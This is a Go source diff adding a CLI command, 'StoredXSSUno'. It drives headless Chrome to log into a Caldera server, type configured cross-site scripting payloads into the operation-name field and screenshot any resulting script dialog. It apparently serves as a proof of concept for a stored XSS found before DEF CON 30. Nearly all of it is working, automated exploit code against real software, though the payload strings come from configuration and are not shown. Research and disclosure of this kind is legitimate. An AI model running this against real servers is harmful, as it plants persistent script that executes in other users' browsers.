@@ -23,36 +23,164 @@ THE SOFTWARE.
 package cmd
 
 import (
+	"context"
 	"fmt"
+	"math"
+	"os"
 
+	"github.com/chromedp/cdproto/emulation"
+	"github.com/chromedp/cdproto/network"
+	"github.com/chromedp/cdproto/page"
+	"github.com/chromedp/chromedp"
+	"github.com/fatih/color"
+	log "github.com/sirupsen/logrus"
 	"github.com/spf13/cobra"
+	"github.com/spf13/viper"
 )
 
-// StoredXSSUnoCmd represents the StoredXSSUno command
+// StoredXSSUnoCmd runs the XSS vulnerability found before DEF CON 30.
 var StoredXSSUnoCmd = &cobra.Command{
 	Use:   "StoredXSSUno",
-	Short: "A brief description of your command",
-	Long: `A longer description that spans multiple lines and likely contains examples
-and usage of using your command. For example:
-
-Cobra is a CLI library for Go that empowers applications.
-This application is a tool to generate the needed files
-to quickly create a Cobra application.`,
+	Short: "Stored XSS found in addition to the previously reported one",
 	Run: func(cmd *cobra.Command, args []string) {
-		fmt.Println("StoredXSSUno called")
+		fmt.Println(color.YellowString(
+			"Introducing stored XSS vulnerability, please wait..."))
+
+		caldera.URL = viper.GetString("login_url")
+		caldera.Creds, err = GetRedCreds(caldera.RepoPath)
+		if err != nil {
+			log.WithError(err).Errorf(
+				"failed to get Caldera credentials: %v", err)
+			os.Exit(1)
+		}
+
+		caldera.Driver.Headless = viper.GetBool("headless")
+		driver, cancels, err := setupChrome(caldera)
+		if err != nil {
+			log.WithError(err).Error("failed to setup Chrome")
+			os.Exit(1)
+		}
+
+		defer cancelAll(cancels)
+
+		caldera.Driver = driver
+
+		caldera, err = Login(caldera)
+		if err != nil {
+			log.WithError(err).Error("failed to login to caldera")
+			os.Exit(1)
+		}
+
+		caldera.URL = viper.GetString("source_url")
+		caldera.Payloads = viper.GetStringSlice("payloads")
+
+		for _, payload := range caldera.Payloads {
+			if err = IntroduceVuln(payload); err != nil {
+				log.WithError(err).WithFields(log.Fields{
+					"Payload": payload,
+				}).Error("failed to introduce the vulnerability")
+			}
+		}
 	},
 }
 
 func init() {
 	rootCmd.AddCommand(StoredXSSUnoCmd)
+}
 
-	// Here you will define your flags and configuration settings.
+// IntroduceVuln introduces a vulnerability into Caldera
+func IntroduceVuln(payload string) error {
+	var buf []byte
 
-	// Cobra supports Persistent Flags which will work for this command
-	// and all subcommands, e.g.:
-	// StoredXSSUnoCmd.PersistentFlags().String("foo", "", "A help for foo")
+	// Selectors for chromeDP
+	rocketSelector := "#home > div.modal.is-active > div.modal-card > footer > button"
+	pageSelector := "#nav-menu > ul:nth-child(2) > li:nth-child(4) > a"
+	createOPSelector := "#select-operation > div:nth-child(3) > button"
+	opNameSelector := "#op-name"
+	startSelector := "#operationsPage > div > div.modal.is-active > div.modal-card > footer > nav > div.level-right > div > button"
 
-	// Cobra supports local flags which will only run when this command
-	// is called directly, e.g.:
-	// StoredXSSUnoCmd.Flags().BoolP("toggle", "t", false, "Help message for toggle")
+	imgPath := viper.GetString("image_path")
+
+	// listen network event
+	listenForNetworkEvent(caldera.Driver.Context)
+
+	// handle payloads that use alerts, prompts, etc.
+	chromedp.ListenTarget(caldera.Driver.Context, func(ev interface{}) {
+		if ev, ok := ev.(*page.EventJavascriptDialogOpening); ok {
+			log.WithFields(log.Fields{
+				"Prompt output": ev.Message,
+				"Payload":       payload,
+			}).Info(color.GreenString("Successfully executed payload!!\n" +
+				"Closing the prompt and screenshotting the aftermath"))
+			go func() {
+				if err := chromedp.Run(caldera.Driver.Context,
+					page.HandleJavaScriptDialog(true),
+				); err != nil {
+					panic(err)
+				}
+			}()
+		}
+	})
+	if err := chromedp.Run(caldera.Driver.Context,
+		network.Enable(),
+		chromedp.WaitVisible(rocketSelector),
+		chromedp.Click(rocketSelector),
+		chromedp.Sleep(Wait(1000)),
+		chromedp.Click(pageSelector),
+		chromedp.Sleep(Wait(1000)),
+		chromedp.Click(createOPSelector),
+		chromedp.SendKeys(opNameSelector, payload),
+		chromedp.Click(startSelector),
+		chromedp.Sleep(Wait(2000)),
+		chromedp.ActionFunc(func(ctx context.Context) error {
+
+			_, _, contentSize, _, _, _, err := page.GetLayoutMetrics().Do(ctx)
+			if err != nil {
+				log.WithError(err).Error("failed to get layout metrics")
+				return err
+			}
+
+			width, height := int64(math.Ceil(contentSize.Width)),
+				int64(math.Ceil(contentSize.Height))
+
+			// force viewport emulation
+			err = emulation.SetDeviceMetricsOverride(width, height, 1, false).
+				WithScreenOrientation(&emulation.ScreenOrientation{
+					Type:  emulation.OrientationTypePortraitPrimary,
+					Angle: 0,
+				}).Do(ctx)
+			if err != nil {
+				log.WithError(err).Error("failed to override device metrics")
+				return err
+			}
+
+			// capture screenshot
+			buf, err = page.CaptureScreenshot().
+				WithQuality(100).
+				WithClip(&page.Viewport{
+					X:      contentSize.X,
+					Y:      contentSize.Y,
+					Width:  contentSize.Width,
+					Height: contentSize.Height,
+					Scale:  2,
+				}).Do(ctx)
+			if err != nil {
+				log.WithError(err).Error("failed to take screenshot")
+				return err
+			}
+			return nil
+		})); err != nil {
+		log.WithError(err).WithFields(log.Fields{
+			"Payload": payload,
+		}).Error("failed to introduce the vulnerability")
+		return err
+	}
+
+	if err := os.WriteFile(imgPath+"1.png", buf, 0644); err != nil {
+		log.WithError(err).Error("failed to write screenshot to disk")
+		return err
+	}
+
+	return nil
+
 }
